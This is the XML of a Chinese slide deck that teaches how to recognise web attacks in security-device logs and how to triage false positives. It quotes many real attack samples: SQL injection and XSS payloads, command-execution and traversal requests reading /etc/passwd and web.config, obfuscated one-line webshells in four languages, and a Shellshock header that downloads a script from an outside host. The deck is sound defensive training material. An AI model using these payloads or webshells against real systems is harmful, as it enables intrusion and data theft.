        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="15367" name="对象 15366"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2207260" y="1681480"/>
          <a:ext cx="7948930" cy="3322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" r:id="rId1" imgW="6734175" imgH="2828925" progId="Paint.Picture">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="6734175" imgH="2828925" progId="Paint.Picture">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 1536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07260" y="1681480"/>
                        <a:ext cx="7948930" cy="33223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攻击出现的位置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0"/>
            <a:ext cx="805053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user-agent部分</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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恶意爬虫：Python-urllib/2.6、Baidu-YunGuanCe-ScanBot(ce.baidu.com)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扫描器：morfeus fucking scanner、Accept: acunetix/wvs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sql注入漏洞：sqlmap/1.0.8.15#dev (http://sqlmap.org)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xss攻击：'%22()%26%25&lt;ScRiPt%20&gt;prompt(961668)&lt;/ScRiPt&gt;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其它非常特殊攻击 ：User-Agent: () { :; }; /bin/mkdir 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/share/HDB_DATA/.../ &amp;&amp; /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0&lt;&amp;1 2&gt;&amp;1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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN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攻击出现的位置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3"/>
            <a:ext cx="8050530" cy="7934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http应答包</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="17415" name="对象 17414"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2207260" y="1654178"/>
          <a:ext cx="7132638" cy="444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" r:id="rId1" imgW="7134225" imgH="4448175" progId="Paint.Picture">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="7134225" imgH="4448175" progId="Paint.Picture">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 1741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07260" y="1654178"/>
                        <a:ext cx="7132638" cy="4448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攻击出现的位置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0"/>
            <a:ext cx="8050530" cy="238135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总结:什么是攻击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在http报文头部，出现了一些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不应该出现的字段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url和post表单，referer、cookie出现了sql语句、系统命令、脚本代码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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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js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代码、php代码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)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一般都不正常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访问或者探测了一些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敏感文件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应答报文可能泄露一些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系统敏感信息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6778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攻击语句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0"/>
            <a:ext cx="805053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攻击经常出现的语句</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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sql注入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xss攻击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命令执行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目录穿越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webshell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信息泄露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网站扫描</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pP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攻击语句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0"/>
            <a:ext cx="805053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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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探测语句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http://www.19cn.com/showdetail.asp?id=49 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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and 1=1 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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http://www.19cn.com/showdetail.asp?id=49 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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or 1=1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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rgbClr val="FF330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and char(124)%2Buser%2Bchar(124)=0（注入类型判断）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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285750" indent="-285750"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权限判断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and user&gt;0  用户名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and 1=(select IS_SRVROLEMEMBER('sysadmin'))  权限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and exists (select * from sysobjects)  数据库类型判断</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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sqlserver</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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攻击语句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0"/>
            <a:ext cx="8050530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查询数据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and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)  查库名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and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status&gt;0  查表名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and (select count(字段名) from 表名)&gt;0  猜字段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and (select top 1 len(username) from admin)=X  猜字段值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http://localhost/mytest/sqlinject/?id=1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+user    union select猜解法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and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) &gt; 11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6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攻击语句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207262" y="3703323"/>
            <a:ext cx="8075295" cy="27997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REQUEST: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GET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/plus/</a:t>
            </a:r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search.php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?keyword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=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as&amp;c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=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d&amp;typeArr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[111%3D@`\'`)+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UnIon+seleCt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+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a HTTP/1.1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Accept: */*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Accept-Language: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zh-cn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User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)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Cookie: JSESSIONID=0000dB5Hac5-0MrKRsyqX6sr-Lr:-1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Host: www.bcu.edu.cn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07263" y="1217295"/>
            <a:ext cx="8075295" cy="206210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REQUEST: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GET /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webDisplay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/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ESite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/English/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DetailSubCollege.jsp?id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=b27e56ef-d3b8-42e1-bf0b-6ca906ee6dec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' and 'x'='x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HTTP/1.1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User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)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Host: www.sada.sh.edu.cn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Accept: */*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Cookie: JSESSIONID=77790B475346A1A5DDA5BB269EF64903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攻击语句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3"/>
            <a:ext cx="8050530" cy="4769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REQUEST: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POST /login/login.asp HTTP/1.1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Content-Length: 304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Accept-Language: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en-us,en;q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=0.5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Accept-Encoding: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gzip,deflate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Host: 211.68.97.16:12000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Accept: text/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html,application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/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xhtml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xml,application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/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xml;q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=0.9,*/*;q=0.8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User-Agent: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sqlmap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/1.0.4.19#dev (http://sqlmap.org)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Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7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Connection: close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Pragma: no-cache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Cache-Control: no-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cache,no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-store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Content-Type: application/x-www-form-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urlencoded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; charset=utf-8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user_no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=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lNiv&amp;user_pass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=&amp;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u_type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=4%'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AND (SELECT 2017 FROM(SELECT COUNT(*),CONCAT(0x7178766b71,(SELECT (ELT(2017=2017,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='&amp;Submit=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+%B5%C7+%C2%BC+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攻击语句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0"/>
            <a:ext cx="805053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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1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常见语句</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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&lt;script&gt;alert(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"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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xss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"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)&lt;/script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&gt;  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脚本</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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img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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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src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="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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javascript:alert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('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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xss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');"&gt;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  属性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&lt;img src="http://ha.ckers.org/xss.jpg"&gt;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&lt;body onload=alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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xss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')&gt;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  事件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&lt;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div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 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style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="background-image: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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url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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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javascript:alert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('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xss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'))"&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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&lt;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style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 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type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="text/javascript"&gt;alert('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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xss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');&lt;/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style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&gt;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&lt;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style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&gt;@import'javascript:alert("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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xss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")';&lt;/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style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&gt;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&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none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link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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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rel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="stylesheet" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600" dirty="0" err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href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="http://ha.ckers.org/xss.css"&gt;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919536" y="518796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攻击语句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04390" y="1207770"/>
            <a:ext cx="8131810" cy="3538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XSS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常见语句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REQUEST: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GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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CuteSoft_Client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/'"()&amp;%&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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ScRiPt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&gt;prompt(994848)&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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ScRiPt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&gt;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/SpellCheck.aspx HTTP/1.1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Referer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: http://emp.bcu.edu.cn/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Cookie: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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ASP.NET_SessionId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=gd1kgz55m5wmrt45oorcal55; ASPSESSIONIDASBQQBCS=MPNDNMCCBNGNECDGKAAIEDMF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Host: emp.bcu.edu.cn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Connection: Keep-alive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Accept-Encoding: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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gzip,deflate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User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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AppleWebKit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/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36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Accept: */*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04390" y="4851400"/>
            <a:ext cx="794893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REQUEST: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GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="160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error_page.htm?flag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='+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alert('XSS')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+' HTTP/1.1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Host: tuan.midea.com.cn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Connection: Keep-Alive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Accept: */*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User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)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184484" y="476673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攻击语句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3"/>
            <a:ext cx="805053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latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>命令执行常见语句</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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en-US" altLang="x-none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GET /simple/tests/tmssql.php?do=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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phpinfo </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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GET /detail.php?id=/winnt/system32/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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cmd.exe?/c+dir+c:%5c </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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GET /cgi/maker/ptcmd.cgi?cmd=;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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cat+/tmp/config/usr.ini</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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GET /cgi/maker/ptcmd.cgi?cmd=;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF330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cat+/etc/passwd</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF3300"/>
              </a:solidFill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1238" y="3113408"/>
            <a:ext cx="6777355" cy="34118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攻击语句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3"/>
            <a:ext cx="8050530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webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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一句话木马</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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x-none" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF000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asp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：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none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&lt;%eval request("cmd")%&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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x-none" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>aspx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4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600">
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["cmd"],"unsafe");%&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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en-US" altLang="x-none" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF000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php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：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none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&lt;?php @eval($_POST[cmd]);?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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x-none" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>jsp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4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none" sz="1600">
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
              </a:rPr>
              <a:t>&lt;%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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>
                <a:solidFill>
                  <a:srgbClr val="FF000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变形：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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x-none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&lt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("123"))%&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none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&lt;?php @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/*-*/0/*-/*-*/]);?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="x-none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攻击语句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3"/>
            <a:ext cx="8050530" cy="7875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webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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一句话木马</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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600" b="1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686" y="1763169"/>
            <a:ext cx="11204628" cy="426656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攻击语句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65863"/>
            <a:ext cx="805053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信息泄露</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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配置文件访问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httpd.conf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htaccess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HTPASSWD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boot.ini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etc/passwd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Php.ini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etc/shadow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  <a:buNone/>
            </a:pP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22240" y="1684655"/>
            <a:ext cx="4682490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REQUEST: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GET /meol/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config HTTP/1.1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Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*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User-Agent: Microsoft URL Control - 6.01.9782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Host: jpkc.bcu.edu.cn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Cache-Control: no-cache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Cookie: JSESSIONID=860CB9EBA379322D9AD9D30FAA558D1B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攻击语句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48080"/>
            <a:ext cx="8050530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敏感后缀及目录探测</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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特殊后缀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en-US" altLang="x-none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.mdb</a:t>
            </a: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、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="x-none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 .sql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en-US" altLang="x-none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.bak</a:t>
            </a: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、.sav、.old、.las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.tmp、.temp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.rar、.zip、.bz、gzip、tar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.conf、inc、ini、bat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.log、stats、statistics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Web.xml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  <a:buNone/>
            </a:pP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34990" y="1717678"/>
            <a:ext cx="468630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/>
              <a:t>REQUEST:</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>GET /meol/manage/web.config.bak HTTP/1.1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>User-Agent: Microsoft URL Control - 6.01.9782</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>Host: jpkc.bcu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>Cache-Control: no-cache</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>Cookie: JSESSIONID=860CB9EBA379322D9AD9D30FAA558D1B</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1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攻击语句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0"/>
            <a:ext cx="805053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应答报文提示信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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目录浏览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Parent Directory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Directory Listing For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Index of /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Welcome to the directory listing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错误信息泄露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数据库错误信息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程序错误信息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3153" y="1198880"/>
            <a:ext cx="2891155" cy="23355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403" y="3738880"/>
            <a:ext cx="5793105" cy="193167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攻击语句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3"/>
            <a:ext cx="805053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网站扫描</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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恶意爬虫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浏览器的user-agent字段一般都比较固定如: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User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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——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IE 9.0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不是浏览器的user-agent，很可能就是爬虫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扫描软件：user-agent字段或者单独标示自己的软件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综合扫描器：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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a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wvs、appscan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专用扫描器：sql注入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  <a:buNone/>
            </a:pP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  <a:buNone/>
            </a:pP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</p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="32775" name="对象 32774"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2270760" y="4636770"/>
          <a:ext cx="603250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" r:id="rId1" imgW="4705350" imgH="561975" progId="StaticMetafile">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="4705350" imgH="561975" progId="StaticMetafile">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 3277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0760" y="4636770"/>
                        <a:ext cx="6032500" cy="768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>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="4" charset="108"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>攻击常见的特点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3"/>
            <a:ext cx="805053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攻击特点：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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攻击一般都有一定的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连续性</a:t>
            </a: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，所以一段时间会产生多条日志，并且命中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特征id</a:t>
            </a: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是有一定分布的，不能是只命中某个特征。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攻击一般都会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借助工具</a:t>
            </a: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进行，同一个IP地址日志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间隔较小</a:t>
            </a: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，可能一秒中产生几条日志，明显不是人操作浏览器的行为。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攻击者可能会借助一定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跳板</a:t>
            </a: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，如果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IP地址是国外</a:t>
            </a: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的，攻击嫌疑较大。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攻击日志的分析流程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3"/>
            <a:ext cx="805053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基于攻击IP地址方法分析（适用日志较多的情况）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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找出一个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明显的攻击行为</a:t>
            </a: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的日志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根据该日志找出攻击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源IP地址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筛选出针对该IP地址的日志，这种情况下基本都是攻击，没有误报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针对该IP地址，利用前面介绍的知识，就可以看出攻击者都发起了哪些攻击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</a:pP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攻击日志的分析流程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0"/>
            <a:ext cx="8050530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基于攻击方法分析（适用每类不太多的攻击）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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rgbClr val="0070C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看攻击语句，是否是明显攻击行为</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill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如果能看出是明显的行为，就可以确定是攻击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如果不确定，还需要结合其他参数，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      源IP地址：是否出现过其他类型可以明确的攻击行为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      攻击时间：如果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半夜或者凌晨活</a:t>
            </a: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动比较频繁，可以怀疑为攻击。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      日志频率：一秒中出现几次日志，可以怀疑为攻击。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      攻击位置：国外的ip地址，可以怀疑为攻击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      报文语义分析：比如访问admin文件夹，可能是有攻击行为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     上述几个参数可以组合分析，进一步确定攻击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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pP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攻击日志的分析流程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3"/>
            <a:ext cx="805053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误报：攻击和应用分不开</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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前面说的用户网站存在一定安全隐患是这种情况的一种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还有一种情况，用户的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应用比较特殊</a:t>
            </a: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，理论上所有规则都能误报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用户是一个论坛类应用，可以提交任意东西，包括文章类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用户是一个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代码提交讨论网站</a:t>
            </a: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，经常通过post表单提交代码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这类应用主要体现在学校应用中较多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攻击日志的分析流程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3"/>
            <a:ext cx="8050530" cy="4181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用户的应用是传一个文章，里面有攻击常见的关键字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</p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="49159" name="对象 49158"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2258060" y="1711960"/>
          <a:ext cx="5695950" cy="257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" r:id="rId1" imgW="5695950" imgH="2571750" progId="StaticMetafile">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="5695950" imgH="2571750" progId="StaticMetafile">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 4915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58060" y="1711960"/>
                        <a:ext cx="5695950" cy="2571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攻击日志的分析流程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3"/>
            <a:ext cx="8050530" cy="7875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用户的应用是代码交流网站，传一段代码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</a:pP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</p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="50183" name="对象 50182"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2207260" y="1665604"/>
          <a:ext cx="7688580" cy="4887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1" imgW="10163175" imgH="5181600" progId="Paint.Picture">
                  <p:embed/>
                </p:oleObj>
              </mc:Choice>
              <mc:Fallback>
                <p:oleObj name="" r:id="rId1" imgW="10163175" imgH="5181600" progId="Paint.Picture">
                  <p:embed/>
                  <p:pic>
                    <p:nvPicPr>
                      <p:cNvPr id="0" name="对象 501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07260" y="1665604"/>
                        <a:ext cx="7688580" cy="48875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攻击日志的分析流程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568" y="1086260"/>
            <a:ext cx="805053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日志分析方法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1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总结</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1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熟悉攻击产生位置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熟悉攻击常见语句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掌握攻击分析方法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常见误报原因及改进措施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找几份日志分析一下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2825" y="1352550"/>
            <a:ext cx="5715000" cy="5505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58" name="文本框 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1981203"/>
            <a:ext cx="311150" cy="3128645"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="40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40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4000" b="1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40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000" b="1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000" b="1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59" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2259385" y="1513523"/>
            <a:ext cx="1943100" cy="1527810"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="51435" tIns="25717" rIns="51435" bIns="25717" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1">
                <a:solidFill>
                  <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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200" b="1">
              <a:solidFill>
                <a:srgbClr val="1B4F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61" name="文本框 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
